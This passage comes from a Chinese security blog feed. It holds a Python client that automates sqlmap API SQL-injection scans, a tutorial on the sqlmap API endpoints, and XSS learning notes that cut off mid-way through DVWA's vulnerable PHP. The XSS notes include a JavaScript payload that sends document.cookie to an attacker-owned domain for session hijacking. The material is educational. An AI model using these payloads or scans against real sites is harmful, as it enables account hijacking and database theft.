headers=self.headers)</span><br><span class="line">        <span class="keyword">if</span> r.json()[<span class="string">&#x27;success&#x27;</span>]:</span><br><span class="line">            self.scan_start_time = time.time()</span><br><span class="line">            <span class="comment">#print(r.json())</span></span><br><span class="line">            <span class="comment">#print(r.json()[&#x27;engineid&#x27;])</span></span><br><span class="line">            <span class="keyword">return</span> r.json()[<span class="string">&#x27;engineid&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#print(r.json())</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_scan_status</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;获取扫描状态的方法,扫描完成返回True，正在扫描返回False&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.status = json.loads(requests.get(self.server + <span class="string">&#x27;/scan/&#x27;</span> + self.taskid + <span class="string">&#x27;/status&#x27;</span>).text)[<span class="string">&#x27;status&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> self.status == <span class="string">&#x27;terminated&#x27;</span>:</span><br><span class="line">            self.scan_end_time = time.time()</span><br><span class="line">            <span class="comment">#print(&quot;扫描完成!&quot;)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> self.status == <span class="string">&#x27;running&#x27;</span>:</span><br><span class="line">            <span class="comment">#print(&quot;Running&quot;)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#print(&quot;未知错误！&quot;)</span></span><br><span class="line">            self.status = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_result</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;获取扫描结果的方法，存在SQL注入返回payload和注入类型等，不存在SQL注入返回空&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(self.status):</span><br><span class="line">            r = requests.get(self.server + <span class="string">&#x27;/scan/&#x27;</span> + self.taskid + <span class="string">&#x27;/data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> (r.json()[<span class="string">&#x27;data&#x27;</span>]):</span><br><span class="line">                <span class="keyword">return</span> r.json()[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_all_task_list</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;获取所有任务列表&#x27;&#x27;&#x27;</span></span><br><span class="line">        r = requests.get(self.server + <span class="string">&#x27;/admin/&#x27;</span> + self.admin_token + <span class="string">&quot;/list&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> r.json()[<span class="string">&#x27;success&#x27;</span>]:</span><br><span class="line">            <span class="comment">#print(r.json()[&#x27;tasks&#x27;])</span></span><br><span class="line">            <span class="keyword">return</span> r.json()[<span class="string">&#x27;tasks&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">del_a_task</span>(<span class="params">self,taskid</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;删除一个任务&#x27;&#x27;&#x27;</span></span><br><span class="line">        r = requests.get(self.server + <span class="string">&#x27;/task/&#x27;</span> + taskid + <span class="string">&#x27;/delete&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r.json()[<span class="string">&#x27;success&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop_a_scan</span>(<span class="params">self,taskid</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;停止一个扫描任务&#x27;&#x27;&#x27;</span></span><br><span class="line">        r = requests.get(self.server + <span class="string">&#x27;/scan/&#x27;</span> + taskid + <span class="string">&#x27;/stop&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r.json()[<span class="string">&#x27;success&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">flush_all_tasks</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;清空所有任务&#x27;&#x27;&#x27;</span></span><br><span class="line">        r =requests.get(self.server + <span class="string">&#x27;/admin/&#x27;</span> + self.admin_token + <span class="string">&quot;/flush&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> r.json()[<span class="string">&#x27;success&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_scan_log</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;获取log&#x27;&#x27;&#x27;</span></span><br><span class="line">        r = requests.get(self.server + <span class="string">&#x27;/scan/&#x27;</span> + self.taskid + <span class="string">&#x27;/log&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Service <span class="keyword">import</span> Client</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;实例化Client对象时需要传递sqlmap api 服务端的ip、port、admin_token和HTTP包的绝对路径&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;————————————————Start Working！—————————————————&quot;</span>)</span><br><span class="line">    target = <span class="built_in">input</span>(<span class="string">&quot;url:&quot;</span>)</span><br><span class="line">    task1 = Thread(target=set_start_get_result,args=(target,))</span><br><span class="line">    task1.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">time_deal</span>(<span class="params">mytime</span>):</span></span><br><span class="line">     first_deal_time = time.localtime(mytime)</span><br><span class="line">     second_deal_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, first_deal_time)</span><br><span class="line">     <span class="keyword">return</span>  second_deal_time</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_start_get_result</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment">#/home/cheng/Desktop/sqldump/1.txt</span></span><br><span class="line">    current_taskid =  my_scan.create_new_task()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;taskid: &quot;</span> + <span class="built_in">str</span>(current_taskid))</span><br><span class="line">    my_scan.set_task_options(url=url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;扫描id:&quot;</span> + <span class="built_in">str</span>(my_scan.start_target_scan(url=url)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;扫描开始时间：&quot;</span> + <span class="built_in">str</span>(time_deal(my_scan.scan_start_time)))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> my_scan.get_scan_status() == <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(my_scan.get_result())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前数据库:&quot;</span> + <span class="built_in">str</span>(my_scan.get_result()[-<span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前数据库用户名:&quot;</span> + <span class="built_in">str</span>(my_scan.get_result()[-<span class="number">2</span>][<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;数据库版本:&quot;</span> + <span class="built_in">str</span>(my_scan.get_result()[-<span class="number">3</span>][<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;扫描结束时间：&quot;</span> + <span class="built_in">str</span>(time_deal(my_scan.scan_end_time)))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;扫描日志：\n&quot;</span> + <span class="built_in">str</span>(my_scan.get_scan_log()))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    my_scan = Client(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;8775&quot;</span>, <span class="string">&quot;c88927c30abb1ef6ea78cb81ac7ac6b0&quot;</span>)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    
    <category term="sqlmap-api" scheme="http://example.com/tags/sqlmap-api/"/>
    
  </entry>
  
  <entry>
    <title>关于sqlmap-api的使用</title>
    <link href="http://example.com/2021/09/20/%E5%85%B3%E4%BA%8Esqlmap-api%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2021/09/20/%E5%85%B3%E4%BA%8Esqlmap-api%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2021-09-20T06:07:19.000Z</published>
    <updated>2021-09-20T06:07:57.834Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3><p>SQLMAP作为一款牛逼的SQL注入神器，所有的渗透测试人员几乎人手一份，但是由于SQLMAP每检测一个站点都需要开启一个新的命令行窗口或者结束掉上一个检测任务。虽然 -m 参数可以批量扫描URL，但是模式也是一个结束扫描后才开始另一个扫描任务。通过api接口，下发扫描任务就简单了，无需开启一个新的命令行窗口。</p><h3 id="sqlmap-api"><a class="markdownIt-Anchor" href="#sqlmap-api"></a> sqlmap api</h3><p>在下载安装SQLMAP后，你会在sqlmap安装目录中找到一个 <a href="http://sqlmapapi.py">sqlmapapi.py</a> 的文件，这个 <a href="http://sqlmapapi.py">sqlmapapi.py</a> 文件就是sqlmmap api。sqlmap api分为服务端和客户端，sqlmap api有两种模式，一种是基于HTTP协议的接口模式，一种是基于命令行的接口模式。</p><p>使用帮助:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmapapi.py -h</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4Gmpd0"><img src="https://z3.ax1x.com/2021/09/20/4Gmpd0.png" alt="4Gmpd0.png" /></a></p><h5 id="开启api服务端"><a class="markdownIt-Anchor" href="#开启api服务端"></a> 开启api服务端</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmapapi.py -s</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4GmUTP"><img src="https://z3.ax1x.com/2021/09/20/4GmUTP.png" alt="4GmUTP.png" /></a></p><p>api服务端在本地8775端口上运行，admin token为1acac56427f272e316fceabe5ddff5a5，IPC数据库的位置在/tmp/sqlmapipc-zOIGm_，api服务端已经和IPC数据库连接上了，正在使用bottle 框架wsgiref标准接口。</p><p>但是通过上面的这种方式开启api服务端有一个缺点，当服务端和客户端不是一台主机会连接不上，因此如果要解决这个问题，可以通过输入以下命令来开启api服务端:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmapapi.py -s -H <span class="string">&quot;0.0.0.0&quot;</span> -p <span class="number">8775</span></span><br></pre></td></tr></table></figure><p>命令成功后，远程客户端就可以通过指定远程主机IP和端口来连接到API服务端。</p><h5 id="基于http协议的接口模式"><a class="markdownIt-Anchor" href="#基于http协议的接口模式"></a> 基于HTTP协议的接口模式</h5><p>下列都是基于HTTP协议API交互的所有方法：提示：“@get”就说明需要通过GET请求的，“@post”就说明需要通过POST请求的；POST请求需要修改HTTP头中的Content-Type字段为application/json。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#辅助</span><br><span class="line">@get(&#x27;/error/401&#x27;)    </span><br><span class="line">@get(&quot;/task/new&quot;)</span><br><span class="line">@get(&quot;/task/&lt;taskid&gt;/delete&quot;)</span><br><span class="line"></span><br><span class="line">#Admin 命令</span><br><span class="line">@get(&quot;/admin/list&quot;)</span><br><span class="line">@get(&quot;/admin/&lt;token&gt;/list&quot;)</span><br><span class="line">@get(&quot;/admin/flush&quot;)</span><br><span class="line">@get(&quot;/admin/&lt;token&gt;/flush&quot;)</span><br><span class="line"></span><br><span class="line">#sqlmap 核心交互命令</span><br><span class="line">@get(&quot;/option/&lt;taskid&gt;/list&quot;)</span><br><span class="line">@post(&quot;/option/&lt;taskid&gt;/get&quot;)</span><br><span class="line">@post(&quot;/option/&lt;taskid&gt;/set&quot;)</span><br><span class="line">@post(&quot;/scan/&lt;taskid&gt;/start&quot;)</span><br><span class="line">@get(&quot;/scan/&lt;taskid&gt;/stop&quot;)</span><br><span class="line">@get(&quot;/scan/&lt;taskid&gt;/kill&quot;)</span><br><span class="line">@get(&quot;/scan/&lt;taskid&gt;/status&quot;)</span><br><span class="line">@get(&quot;/scan/&lt;taskid&gt;/data&quot;)</span><br><span class="line">@get(&quot;/scan/&lt;taskid&gt;/log/&lt;start&gt;/&lt;end&gt;&quot;)</span><br><span class="line">@get(&quot;/scan/&lt;taskid&gt;/log&quot;)</span><br><span class="line">@get(&quot;/download/&lt;taskid&gt;/&lt;target&gt;/&lt;filename:path&gt;&quot;)</span><br></pre></td></tr></table></figure><p><strong>@get(’/error/401’):</strong></p><p><a href="https://imgtu.com/i/4GnODs"><img src="https://z3.ax1x.com/2021/09/20/4GnODs.png" alt="4GnODs.png" /></a></p><p>结合这段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@return_error(<span class="params"><span class="number">401</span></span>)  </span><span class="comment"># Access Denied</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error401</span>(<span class="params">error=<span class="literal">None</span></span>):</span></span><br><span class="line">    security_headers(<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Access denied&quot;</span></span><br></pre></td></tr></table></figure><p>首先需要登录（Admin token），不然会返回状态码401。</p><p><strong>@get(&quot;/task/new&quot;)</strong></p><p>该接口用于创建一个新的任务，使用后会返回一个随机的taskid</p><p><a href="https://imgtu.com/i/4GuAbR"><img src="https://z3.ax1x.com/2021/09/20/4GuAbR.png" alt="4GuAbR.png" /></a></p><p>在python内调用：</p><p><a href="https://imgtu.com/i/4GKjhV"><img src="https://z3.ax1x.com/2021/09/20/4GKjhV.png" alt="4GKjhV.png" /></a></p><p><strong>@get(&quot;/task/<taskid>/delete&quot;)</strong></p><p>该接口用于删除taskid。在调用时指定taskid</p><p><a href="https://imgtu.com/i/4GMZ9K"><img src="https://z3.ax1x.com/2021/09/20/4GMZ9K.png" alt="4GMZ9K.png" /></a></p><p><strong>@get(&quot;/admin/list&quot;)</strong></p><p><strong>@get(&quot;/admin/<token>/list&quot;)</strong></p><p>该接口用于返回所有taskid。也可以在调用时指定taskid，返回所有id的状态</p><p><a href="https://imgtu.com/i/4GlSeJ"><img src="https://z3.ax1x.com/2021/09/20/4GlSeJ.png" alt="4GlSeJ.png" /></a></p><p>调用接口：</p><p><a href="https://imgtu.com/i/4GQ4sg"><img src="https://z3.ax1x.com/2021/09/20/4GQ4sg.png" alt="4GQ4sg.png" /></a></p><p><strong>@get(&quot;/admin/flush&quot;)</strong><br /><strong>@get(&quot;/admin/<token>/flush&quot;)</strong></p><p>该接口用于删除所有任务</p><p><a href="https://imgtu.com/i/4GlMFI"><img src="https://z3.ax1x.com/2021/09/20/4GlMFI.png" alt="4GlMFI.png" /></a></p><p>调用接口：</p><p><a href="https://imgtu.com/i/4Gl0f0"><img src="https://z3.ax1x.com/2021/09/20/4Gl0f0.png" alt="4Gl0f0.png" /></a></p><p><strong>@post(&quot;/option/<taskid>/set&quot;)</strong></p><p>该接口为特定任务ID设置选项值，调用时请指定taskid</p><p><a href="https://imgtu.com/i/4Glft1"><img src="https://z3.ax1x.com/2021/09/20/4Glft1.png" alt="4Glft1.png" /></a></p><p>调用接口：</p><p><a href="https://imgtu.com/i/4G8bBF"><img src="https://z3.ax1x.com/2021/09/20/4G8bBF.png" alt="4G8bBF.png" /></a></p><p><strong>@get(&quot;/option/<taskid>/list&quot;)</strong></p><p>该接口可获取特定任务ID的列表选项，调用时指定taskid。</p><p><a href="https://imgtu.com/i/4Glg0J"><img src="https://z3.ax1x.com/2021/09/20/4Glg0J.png" alt="4Glg0J.png" /></a></p><p>调用接口：</p><p><a href="https://imgtu.com/i/4GGpjK"><img src="https://z3.ax1x.com/2021/09/20/4GGpjK.png" alt="4GGpjK.png" /></a></p><p><strong>@post(&quot;/option/<taskid>/get&quot;)</strong></p><p>该接口可获取特定任务ID的选项值，调用时请指定taskid</p><p><a href="https://imgtu.com/i/4GGmgP"><img src="https://z3.ax1x.com/2021/09/20/4GGmgP.png" alt="4GGmgP.png" /></a>d</p><p>调用接口：</p><p><a href="https://imgtu.com/i/4GGBE4"><img src="https://z3.ax1x.com/2021/09/20/4GGBE4.png" alt="4GGBE4.png" /></a></p><p><strong>@post(&quot;/scan/<taskid>/start&quot;)</strong></p><p>该接口定义开始扫描特定任务，调用时请指定taskid</p><p><a href="https://imgtu.com/i/4GGfbD"><img src="https://z3.ax1x.com/2021/09/20/4GGfbD.png" alt="4GGfbD.png" /></a></p><p>调用接口：需要提前借助status来看是否运行</p><p><a href="https://imgtu.com/i/4GJTwF"><img src="https://z3.ax1x.com/2021/09/20/4GJTwF.png" alt="4GJTwF.png" /></a></p><p><strong>@get(&quot;/scan/<taskid>/stop&quot;)</strong></p><p>该接口定义停止扫描特定任务，调用时请指定taskid</p><p><a href="https://imgtu.com/i/4GJXS1"><img src="https://z3.ax1x.com/2021/09/20/4GJXS1.png" alt="4GJXS1.png" /></a></p><p>调用接口：</p><p><a href="https://imgtu.com/i/4GYpwD"><img src="https://z3.ax1x.com/2021/09/20/4GYpwD.png" alt="4GYpwD.png" /></a></p><p><strong>@get(&quot;/scan/<taskid>/kill&quot;)</strong></p><p>该接口可杀死特定任务，需要指定taskid</p><p><a href="https://imgtu.com/i/4GYMkQ"><img src="https://z3.ax1x.com/2021/09/20/4GYMkQ.png" alt="4GYMkQ.png" /></a></p><p><strong>@get(&quot;/scan/<taskid>/status&quot;)</strong></p><p>该接口可查询扫描状态，调用时请指定taskid</p><p><a href="https://imgtu.com/i/4GYJXV"><img src="https://z3.ax1x.com/2021/09/20/4GYJXV.png" alt="4GYJXV.png" /></a></p><p><strong>@get(&quot;/scan/<taskid>/data&quot;)</strong></p><p>该接口可获得到扫描结果，调用时请指定taskid</p><p><a href="https://imgtu.com/i/4GYWAe"><img src="https://z3.ax1x.com/2021/09/20/4GYWAe.png" alt="4GYWAe.png" /></a></p><p>调用接口：</p><p><a href="https://imgtu.com/i/4GYr11"><img src="https://z3.ax1x.com/2021/09/20/4GYr11.png" alt="4GYr11.png" /></a></p><p><strong>@get(&quot;/scan/<taskid>/log/<start>/<end>&quot;)</strong></p><p><strong>@get(&quot;/scan/<taskid>/log&quot;)</strong></p><p>该接口可查询特定任务的扫描的日志，调用时请指定taskid</p><p><a href="https://imgtu.com/i/4GYI1I"><img src="https://z3.ax1x.com/2021/09/20/4GYI1I.png" alt="4GYI1I.png" /></a></p><p>调用接口：</p><p><a href="https://imgtu.com/i/4GYz3n"><img src="https://z3.ax1x.com/2021/09/20/4GYz3n.png" alt="4GYz3n.png" /></a></p><p><strong>@get(&quot;/download/<taskid>/<target>/<a href="filename:path">filename:path</a>&quot;)</strong></p><p>下载服务端指定任务的文件</p><p><a href="https://imgtu.com/i/4GtiHU"><img src="https://z3.ax1x.com/2021/09/20/4GtiHU.png" alt="4GtiHU.png" /></a></p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>基于HTTP的接口模式用起来可能比较繁琐，但是对于程序调用接口还是很友善的。总之该模式的流程是：</p><p>1、通过GET请求 <a href="http://ip/">http://ip:port</a>/task/new 这个地址，创建一个新的扫描任务；</p><p>2、通过POST请求<a href="http://ip/">http://ip:port</a>/scan//start 地址，并通过json格式提交参数，开启一个扫描；通过GET请求 <a href="http://ip/">http://ip:port/</a>scan//status 地址，即可获取指定的taskid的扫描状态。这个返回值分为两种，一种是run状态（扫描未完成），一种是terminated状态（扫描完成）；</p><p>3、扫描完成后获取扫描的结果。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h3&gt;
&lt;p&gt;SQLMAP作为一款牛逼的SQL注入神器，所有的渗透测试人员几乎人手一份，但是由于SQLMAP每检测一个站点都需要开启一个新的命令行窗口或者结束</summary>
      
    
    
    
    
    <category term="sqlmap api" scheme="http://example.com/tags/sqlmap-api/"/>
    
  </entry>
  
  <entry>
    <title>三种xss的利用学习笔记</title>
    <link href="http://example.com/2021/09/20/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2021/09/20/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-09-20T01:53:16.000Z</published>
    <updated>2021-09-20T02:43:08.222Z</updated>
    
    <content type="html"><![CDATA[<h5 id="xss简介"><a class="markdownIt-Anchor" href="#xss简介"></a> XSS简介</h5><p>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码(一般是JS代码)到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。它常常与其他漏洞一起造成破坏性的后果。</p><h5 id="xss的分类"><a class="markdownIt-Anchor" href="#xss的分类"></a> XSS的分类</h5><p>XSS漏洞表现为多种形式，并且分为三种类型：反射型、储存型，DOM型。</p><h5 id="反射型xss"><a class="markdownIt-Anchor" href="#反射型xss"></a> 反射型XSS</h5><p>反射型XXS是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。</p><p>提取用户提交的输入并将其插入到服务器相应的html代码中，这是XSS漏洞的明显特征，如果应用程序没有实施任何过滤和净化，那么它很容易被攻击。</p><p>在输入框中咱们构造如下JS代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果页面出现弹窗，说明咱们插入的恶意代码被执行，结果如下图</p><p><a href="https://imgtu.com/i/48zJpV"><img src="https://z3.ax1x.com/2021/09/20/48zJpV.png" alt="48zJpV.png" /></a></p><p>如何利用反射型XSS漏洞呢？</p><p>最简单的一种攻击就是攻击者截获通过验证用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户经授权访问的所有数据和功能。</p><p>(1) 用户登录应用程序</p><p>(2) 攻击者将自己准备的url提交给用户</p><p>(3) 用户请求攻击者url</p><p>(4) 服务器对攻击者的js代码做出回应</p><p>(5)  攻击者的js代码在服务器中运行</p><p>(6) 用户的浏览器向攻击者发送会话文件</p><p>(7) 攻击者劫持用户的会话</p><p>攻击者创建的恶意代码为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="keyword">new</span> Image;i.src=<span class="string">&quot;http://shenmewanyi.com/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p><a href="http://xn--shenmewanyi-eu0r0a371pvoa922akm6cvy9aymg7n6blrm1k9g89i6jz.com">这段代码可以让用户浏览器向shenmewanyi.com</a>(攻击者拥有的一个域)提出一个请求。请求中包含用户访问应用程序的当前会话令牌。</p><h5 id="存储型xss"><a class="markdownIt-Anchor" href="#存储型xss"></a> 存储型XSS</h5><p>如果一名用户提交的数据被保存到数据库中，然后不经过过滤或净化就显示给其他用户，这时候就会出现存储型XSS。</p><p>利用存储型XSS漏洞的攻击至少需要向应用程序提出两个请求。攻击者在第一个请求中构造JavaScript，应用程序接受并保存。在第二个请求中，一名受害者查看包含恶意代码的页面，这时JavaScript开始执行。</p><p>依然是会话劫持:</p><p>(1) 攻击者现在程序提交恶意代码，用户登录应用程序</p><p>(2) 用户浏览带有恶意代码的界面</p><p>(3) 服务器对攻击者的js代码做出回应</p><p>(4)  攻击者的js代码在服务器中运行</p><p>(6) 用户的浏览器向攻击者发送会话文件</p><p>(7) 攻击者劫持用户的会话</p><p>因为存储型XSS是永久性的，所以往往造成更大的安全威胁。攻击者可以向应用程序提交一些专门设计的数据，然后等待受害者访问它们。如果其中一位受害者是管理员，那么攻击者可以完全攻破整个应用程序。</p><p>参考dvwa的核心代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">    $name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = 